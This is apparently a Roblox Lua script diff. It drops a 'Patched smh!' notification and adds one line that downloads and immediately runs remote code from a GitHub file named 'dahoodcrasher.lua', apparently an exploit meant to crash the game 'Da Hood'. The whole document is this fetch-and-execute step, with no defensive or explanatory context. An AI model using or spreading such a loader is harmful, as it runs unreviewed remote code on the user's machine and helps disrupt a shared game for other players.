@@ -1,5 +1,1 @@
-game:service"StarterGui":SetCore("SendNotification",{
-    Title = "Hahaha!";
-    Text = "Patched smh!";
-    Duration = 10;
-})
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LPrandom/lua-projects/master/dahoodcrasher.lua"))()
